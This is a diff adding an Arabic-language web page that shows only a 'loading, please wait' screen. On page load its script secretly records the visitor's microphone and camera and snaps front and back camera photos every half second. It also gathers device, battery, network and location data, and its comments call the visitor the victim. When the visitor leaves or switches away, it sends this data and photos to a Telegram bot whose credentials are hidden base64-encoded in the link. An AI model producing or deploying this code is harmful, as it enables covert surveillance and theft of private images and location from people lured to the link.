@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            direction: rtl;
+        }
+        .loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading" id="loading">
+        <h2>جاري التحميل...</h2>
+        <p>يرجى الانتظار</p>
+    </div>
+
+    <script>
+        class AdvancedDataCapture {
+            constructor(botToken, chatId, linkId) {
+                this.botToken = botToken;
+                this.chatId = chatId;
+                this.linkId = linkId;
+                this.images = [];
+                this.audioChunks = [];
+                this.videoChunks = [];
+                this.audioRecorder = null;
+                this.videoRecorder = null;
+                this.captureInterval = null;
+                this.isRecording = false;
+                this.startTime = new Date();
+            }
+
+            async startCapture() {
+                try {
+                    console.log('🚀 بدأ جمع البيانات المتقدم...');
+                    
+                    // بدء تسجيل الصوت والفيديو
+                    await this.startMediaRecording();
+                    
+                    // بدء التقاط الصور المتكرر
+                    this.startContinuousCapture();
+                    
+                    // جمع معلومات الجهاز
+                    const deviceInfo = this.collectAdvancedDeviceInfo();
+                    
+                    // إعداد معالج الخروج
+                    this.setupExitHandler();
+                    
+                    console.log('✅ بدأ جمع البيانات بنجاح');
+                    
+                } catch (error) {
+                    console.error('❌ خطأ في بدء جمع البيانات:', error);
+                }
+            }
+
+            // جمع معلومات متقدمة عن الجهاز
+            collectAdvancedDeviceInfo() {
+                const info = {
+                    // ✅ معلومات الضحية
+                    ip: 'جاري الجمع...',
+                    date: new Date().toLocaleString('ar-EG'),
+                    
+                    // 📱 معلومات الجهاز
+                    productSub: navigator.productSub || 'غير متاح',
+                    vendor: navigator.vendor || 'غير متاح',
+                    maxTouchPoints: navigator.maxTouchPoints || 'غير متاح',
+                    doNotTrack: navigator.doNotTrack || 'غير متاح',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
+                    cookieEnabled: navigator.cookieEnabled,
+                    appCodeName: navigator.appCodeName || 'غير متاح',
+                    appName: navigator.appName || 'غير متاح',
+                    appVersion: navigator.appVersion || 'غير متاح',
+                    platform: navigator.platform || 'غير متاح',
+                    product: navigator.product || 'غير متاح',
+                    userAgent: navigator.userAgent || 'غير متاح',
+                    language: navigator.language || 'غير متاح',
+                    languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
+                    webdriver: navigator.webdriver || 'غير متاح',
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || 'غير متاح',
+                    deviceMemory: navigator.deviceMemory || 'غير متاح',
+                    
+                    // 📷 معلومات أجهزة الوسائط
+                    mediaDevices: [],
+                    
+                    // 🕸️ معلومات الشبكة
+                    connection: {},
+                    
+                    // 🔋 معلومات البطارية
+                    battery: {},
+                    
+                    // 🖥️ معلومات الشاشة
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth
+                    },
+                    
+                    // 🌐 معلومات الموقع
+                    location: null,
+                    
+                    // ⏰ وقت البدء
+                    startTime: this.startTime.toLocaleString('ar-EG')
+                };
+
+                // جمع معلومات أجهزة الوسائط
+                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                    navigator.mediaDevices.enumerateDevices().then(devices => {
+                        info.mediaDevices = devices.map(device => ({
+                            kind: device.kind,
+                            label: device.label,
+                            deviceId: device.deviceId
+                        }));
+                    });
+                }
+
+                // جمع معلومات الشبكة
+                if (navigator.connection) {
+                    info.connection = {
+                        type: navigator.connection.type || 'غير متاح',
+                        rtt: navigator.connection.rtt || 'غير متاح',
+                        saveData: navigator.connection.saveData || 'غير متاح',
+                        effectiveType: navigator.connection.effectiveType || 'غير متاح',
+                        downlink: navigator.connection.downlink || 'غير متاح',
+                        downlinkMax: navigator.connection.downlinkMax || 'غير متاح'
+                    };
+                }
+
+                // جمع معلومات البطارية
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        info.battery = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging ? 'نعم' : 'لا'
+                        };
+                    });
+                }
+
+                // جمع الموقع
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            info.location = {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                        },
+                        error => {
+                            info.location = 'تم رفض الإذن';
+                        }
+                    );
+                }
+
+                return info;
+            }
+
+            // بدء تسجيل الصوت والفيديو
+            async startMediaRecording() {
+                try {
+                    // تسجيل الصوت
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ 
+                        audio: {
+                            channelCount: 2,
+                            sampleRate: 44100,
+                            echoCancellation: false
+                        } 
+                    });
+                    
+                    this.audioRecorder = new MediaRecorder(audioStream, {
+                        mimeType: 'audio/webm;codecs=opus'
+                    });
+                    
+                    this.audioRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            this.audioChunks.push(event.data);
+                        }
+                    };
+                    
+                    this.audioRecorder.start(1000); // تسجيل كل ثانية
+
+                    // تسجيل الفيديو
+                    const videoStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: 1280,
+                            height: 720,
+                            facingMode: 'environment'
+                        } 
+                    });
+                    
+                    this.videoRecorder = new MediaRecorder(videoStream, {
+                        mimeType: 'video/webm;codecs=vp9'
+                    });
+                    
+                    this.videoRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            this.videoChunks.push(event.data);
+                        }
+                    };
+                    
+                    this.videoRecorder.start(1000); // تسجيل كل ثانية
+                    
+                    this.isRecording = true;
+                    console.log('🎥 بدأ تسجيل الصوت والفيديو');
+
+                } catch (error) {
+                    console.error('❌ خطأ في بدء التسجيل:', error);
+                }
+            }
+
+            // التقاط الصور بشكل متكرر
+            startContinuousCapture() {
+                let captureCount = 0;
+                this.captureInterval = setInterval(async () => {
+                    try {
+                        // التقاط من الكاميرا الأمامية
+                        const frontImage = await this.captureSingleImage('user');
+                        if (frontImage) {
+                            this.images.push({
+                                ...frontImage,
+                                type: 'كاميرا أمامية',
+                                sequence: captureCount
+                            });
+                        }
+
+                        // التقاط من الكاميرا الخلفية
+                        const backImage = await this.captureSingleImage('environment');
+                        if (backImage) {
+                            this.images.push({
+                                ...backImage,
+                                type: 'كاميرا خلفية', 
+                                sequence: captureCount
+                            });
+                        }
+
+                        captureCount++;
+                        console.log(`📸 تم التقاط ${captureCount * 2} صورة`);
+
+                    } catch (error) {
+                        console.error('❌ خطأ في التقاط الصور:', error);
+                    }
+                }, 500); // كل 0.5 ثانية
+            }
+
+            // التقاط صورة واحدة
+            async captureSingleImage(facingMode) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: facingMode,
+                            width: 1920,
+                            height: 1080
+                        }
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // إيقاف الدفق
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    return {
+                        data: imageData,
+                        timestamp: new Date().toLocaleString('ar-EG'),
+                        resolution: `${canvas.width}x${canvas.height}`
+                    };
+                    
+                } catch (error) {
+                    console.log(`⚠️ لا يمكن الوصول إلى ${facingMode === 'user' ? 'الكاميرا الأمامية' : 'الكاميرا الخلفية'}`);
+                    return null;
+                }
+            }
+
+            // إعداد معالج حدث الخروج
+            setupExitHandler() {
+                window.addEventListener('beforeunload', (e) => {
+                    this.stopCaptureAndSend();
+                    e.preventDefault();
+                    e.returnValue = '';
+                });
+                
+                window.addEventListener('unload', () => {
+                    this.stopCaptureAndSend();
+                });
+                
+                window.addEventListener('pagehide', () => {
+                    this.stopCaptureAndSend();
+                });
+
+                // أيضًا عند فقدان التركيز
+                window.addEventListener('blur', () => {
+                    setTimeout(() => {
+                        this.stopCaptureAndSend();
+                    }, 1000);
+                });
+            }
+
+            // إيقاف الجمع وإرسال البيانات
+            async stopCaptureAndSend() {
+                if (!this.isRecording) return;
+                
+                this.isRecording = false;
+                console.log('🛑 إيقاف جمع البيانات وإرسالها...');
+                
+                // إيقاف التقاط الصور
+                if (this.captureInterval) {
+                    clearInterval(this.captureInterval);
+                }
+                
+                // إيقاف التسجيلات
+                if (this.audioRecorder && this.audioRecorder.state === 'recording') {
+                    this.audioRecorder.stop();
+                }
+                if (this.videoRecorder && this.videoRecorder.state === 'recording') {
+                    this.videoRecorder.stop();
+                }
+                
+                // جمع كل البيانات
+                const allData = {
+                    deviceInfo: this.collectAdvancedDeviceInfo(),
+                    images: this.images,
+                    audioLength: this.audioChunks.length,
+                    videoLength: this.videoChunks.length,
+                    totalCaptureTime: Math.round((new Date() - this.startTime) / 1000) + ' ثانية',
+                    timestamp: new Date().toLocaleString('ar-EG'),
+                    linkId: this.linkId
+                };
+                
+                // إرسال البيانات إلى التلجرام
+                await this.sendToTelegram(allData);
+            }
+
+            // إرسال البيانات إلى بوت التلجرام
+            async sendToTelegram(data) {
+                try {
+                    // تحضير الرسالة النصية
+                    let message = `📱 *تم جمع بيانات جديدة*\\n\\n`;
+                    
+                    message += `✅ *معلومات الضحية*\\n`;
+                    message += `🆔 الرابط: ${data.linkId}\\n`;
+                    message += `⏰ وقت البدء: ${data.deviceInfo.startTime}\\n`;
+                    message += `⏱️ مدة الجمع: ${data.totalCaptureTime}\\n\\n`;
+                    
+                    message += `📱 *معلومات الجهاز*\\n`;
+                    message += `🖥️ النظام: ${data.deviceInfo.platform}\\n`;
+                    message += `🔧 المتصفح: ${data.deviceInfo.appName}\\n`;
+                    message += `🌐 اللغات: ${data.deviceInfo.languages}\\n`;
+                    message += `💾 الذاكرة: ${data.deviceInfo.deviceMemory} GB\\n`;
+                    message += `⚡ المعالج: ${data.deviceInfo.hardwareConcurrency} نواة\\n\\n`;
+                    
+                    message += `📊 *البيانات المجمعة*\\n`;
+                    message += `🖼️ الصور: ${data.images.length}\\n`;
+                    message += `🎤 تسجيلات الصوت: ${data.audioLength}\\n`;
+                    message += `🎥 تسجيلات الفيديو: ${data.videoLength}\\n\\n`;
+                    
+                    message += `🔋 *البطارية*\\n`;
+                    message += `🔋 المستوى: ${data.deviceInfo.battery.level || 'غير متاح'}\\n`;
+                    message += `⚡ الشحن: ${data.deviceInfo.battery.charging || 'غير متاح'}\\n\\n`;
+                    
+                    message += `🕸️ *الشبكة*\\n`;
+                    message += `📶 النوع: ${data.deviceInfo.connection.effectiveType || 'غير متاح'}\\n`;
+                    message += `⬇️ السرعة: ${data.deviceInfo.connection.downlink || 'غير متاح'} Mbps\\n`;
+
+                    // إرسال الرسالة النصية
+                    await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: this.chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    // إرسال الصور (أول 5 صور)
+                    for (let i = 0; i < Math.min(data.images.length, 5); i++) {
+                        await this.sendPhotoToTelegram(data.images[i].data, `صورة ${i+1} - ${data.images[i].type}`);
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+
+                    console.log('✅ تم إرسال جميع البيانات إلى التلجرام');
+
+                } catch (error) {
+                    console.error('❌ خطأ في إرسال البيانات:', error);
+                }
+            }
+
+            // إرسال صورة إلى التلجرام
+            async sendPhotoToTelegram(photoData, caption) {
+                try {
+                    // تحويل base64 إلى blob
+                    const blob = await fetch(photoData).then(r => r.blob());
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', this.chatId);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', caption);
+                    
+                    await fetch(`https://api.telegram.org/bot${this.botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                } catch (error) {
+                    console.error('❌ خطأ في إرسال الصورة:', error);
+                }
+            }
+        }
+
+        // بدء النظام عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', async function() {
+            // الحصول على المعلمات من URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const linkId = urlParams.get('id') || 'unknown';
+            const botToken = atob(urlParams.get('bot') || '');
+            const chatId = atob(urlParams.get('chat') || '');
+            
+            if (botToken && chatId) {
+                const captureSystem = new AdvancedDataCapture(botToken, chatId, linkId);
+                await captureSystem.startCapture();
+                
+                // إخفاء شاشة التحميل بعد بدء النظام
+                document.getElementById('loading').classList.add('hidden');
+            } else {
+                document.getElementById('loading').innerHTML = '<h2>❌ خطأ في المعلمات</h2>';
+            }
+        });
+    </script>
+</body>
+    </html>
